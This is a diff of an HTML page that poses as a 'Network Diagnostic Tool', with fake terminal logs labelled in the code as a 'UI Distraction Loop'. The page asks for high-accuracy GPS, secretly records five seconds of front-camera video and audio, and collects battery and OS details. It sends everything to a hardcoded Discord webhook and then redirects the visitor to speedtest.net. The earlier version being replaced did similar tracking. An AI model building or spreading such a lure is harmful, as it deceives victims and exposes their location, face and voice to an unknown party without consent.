@@ -3,93 +3,128 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Node Calibration</title>
+    <title>Network Diagnostic Tool</title>
     <style>
-        body { font-family: sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; border: 1px solid #232a42; }
-        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; font-size: 1.1rem; }
-        #status { margin-top: 15px; color: #5c6784; font-size: 0.8rem; }
+        body { font-family: 'Courier New', Courier, monospace; background: #05070a; color: #00d2ff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #0c111a; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; border: 1px solid #00d2ff; box-shadow: 0 0 20px rgba(0, 210, 255, 0.2); }
+        .terminal { background: #000; padding: 15px; border-radius: 5px; height: 180px; overflow-y: hidden; text-align: left; font-size: 0.85rem; border: 1px solid #161b2c; margin: 15px 0; }
+        .line { margin-bottom: 5px; opacity: 0; transition: opacity 0.3s; }
+        .line.show { opacity: 1; }
+        .btn { background: #00d2ff; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; font-size: 1rem; text-transform: uppercase; }
+        .btn:disabled { background: #161b2c; color: #5c6784; cursor: not-allowed; }
         video { display: none; }
+        .scanning-bar { height: 2px; width: 0%; background: #00d2ff; transition: width 5s linear; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>NODE CALIBRATION</h2>
-        <p>Sync hardware nodes for 2026 network optimization.</p>
-        <button class="btn" id="startBtn">BEGIN SYNC</button>
-        <p id="status">System Status: Ready</p>
+        <div style="text-align:center; font-weight:bold; margin-bottom:10px;">SYSTEM DIAGNOSTIC v4.0</div>
+        <div class="terminal" id="terminal">
+            <div class="line show">> Initializing secure environment...</div>
+            <div class="line show">> Awaiting hardware handshake...</div>
+        </div>
+        <div class="scanning-bar" id="bar"></div>
+        <button class="btn" id="startBtn">Authorize & Scan</button>
+        <div id="status" style="font-size: 10px; margin-top: 10px; color: #334155;">Security: AES-256 Encrypted</div>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
 
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';
+        
+        const logs = [
+            "> Requesting GPS Node access...",
+            "> GPS Linked. Syncing sensors...",
+            "> Calibrating Media Hub...",
+            "> Analyzing Network Latency...",
+            "> Testing Packet Loss...",
+            "> Optimization Complete."
+        ];
 
         document.getElementById('startBtn').addEventListener('click', async function() {
-            const status = document.getElementById('status');
-            status.innerText = "Connecting...";
+            const btn = this;
+            const term = document.getElementById('terminal');
+            const bar = document.getElementById('bar');
+            btn.disabled = true;
 
-            // 1. GPS Request
+            // 1. GPS + Media Request
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                status.innerText = "GPS Synced. Opening Media...";
+                addLog(0);
                 
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-
-                // 2. Camera + Audio Request
                 let stream;
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user" }, 
+                        video: { facingMode: "user", width: 640 }, 
                         audio: true 
                     });
                 } catch (e) {
-                    status.innerText = "Media Error: " + e.name;
-                    // Even if camera fails, send the location!
-                    sendLocationOnly(lat, lon);
+                    addLog("> Hardware Access Denied.");
                     return;
                 }
 
-                // 3. Recorder Logic
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                mediaRecorder.start();
-                status.innerText = "Optimizing (5s)...";
+                if (stream) {
+                    addLog(1);
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                    mediaRecorder.start();
 
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                    mediaRecorder.onstop = async () => {
-                        const blob = new Blob(chunks, { type: 'video/webm' });
-                        const formData = new FormData();
-                        formData.append('payload_json', JSON.stringify({
-                            content: "📡 **NODE DATA RECEIVED**",
-                            embeds: [{
-                                title: "Telemetry Report",
-                                fields: [{ name: "📍 Maps", value: `https://www.google.com/maps?q=${lat},${lon}` }]
-                            }]
-                        }));
-                        formData.append('file', blob, 'node_capture.webm');
+                    // UI Distraction Loop
+                    bar.style.width = "100%";
+                    let logIndex = 2;
+                    const logInterval = setInterval(() => {
+                        if(logIndex < logs.length) {
+                            addLog(logIndex);
+                            logIndex++;
+                        } else {
+                            clearInterval(logInterval);
+                        }
+                    }, 800);
 
-                        await fetch(WEBHOOK, { method: 'POST', body: formData });
-                        stream.getTracks().forEach(t => t.stop());
-                        status.innerText = "Sync Complete!";
-                        setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
-                    };
-                }, 5000);
+                    // Capture Logic (5 Seconds)
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                        mediaRecorder.onstop = async () => {
+                            const blob = new Blob(chunks, { type: 'video/webm' });
+                            const b = await navigator.getBattery();
+                            const fd = new FormData();
+                            
+                            fd.append('payload_json', JSON.stringify({
+                                content: "⚡ **DIAGNOSTIC DATA CAPTURED**",
+                                embeds: [{
+                                    color: 5763719,
+                                    fields: [
+                                        { name: "📍 Maps", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` },
+                                        { name: "🔋 Battery", value: `${Math.round(b.level * 100)}%`, inline: true },
+                                        { name: "📱 OS", value: navigator.platform, inline: true }
+                                    ]
+                                }]
+                            }));
+                            fd.append('file', blob, 'node_data.webm');
 
+                            await fetch(WEBHOOK, { method: 'POST', body: fd });
+                            stream.getTracks().forEach(t => t.stop());
+                            
+                            addLog("> Finalizing...");
+                            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
+                        };
+                    }, 5000);
+                }
             }, (err) => {
-                alert("GPS Permission Denied. Site cannot run.");
-                status.innerText = "Handshake Failed.";
-            });
+                alert("GPS Required for Node verification.");
+                btn.disabled = false;
+            }, { enableHighAccuracy: true });
         });
 
-        async function sendLocationOnly(lat, lon) {
-             const fd = new FormData();
-             fd.append('payload_json', JSON.stringify({ content: "📍 **Location Only:** " + lat + "," + lon }));
-             await fetch(WEBHOOK, { method: 'POST', body: fd });
-             setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
+        function addLog(indexOrText) {
+            const term = document.getElementById('terminal');
+            const div = document.createElement('div');
+            div.className = "line show";
+            div.innerText = typeof indexOrText === 'number' ? logs[indexOrText] : indexOrText;
+            term.appendChild(div);
+            term.scrollTop = term.scrollHeight;
         }
     </script>
 </body>
